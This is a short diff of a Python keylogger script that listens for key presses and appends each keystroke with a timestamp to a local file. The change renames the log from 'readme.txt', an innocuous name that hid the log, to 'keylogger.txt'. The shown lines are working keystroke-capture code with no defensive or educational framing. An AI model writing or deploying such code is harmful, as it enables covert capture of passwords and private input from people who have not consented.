@@ -11,7 +11,7 @@ def get_key(key):
         key = "\n"
     if key == "Key.shift_r":
         key = ""
-    with open("readme.txt", "a") as f:
+    with open("keylogger.txt", "a") as f:
         f.write(current_date_time + " - " +key+"\n")
 
 with Listener(on_press=get_key) as l:
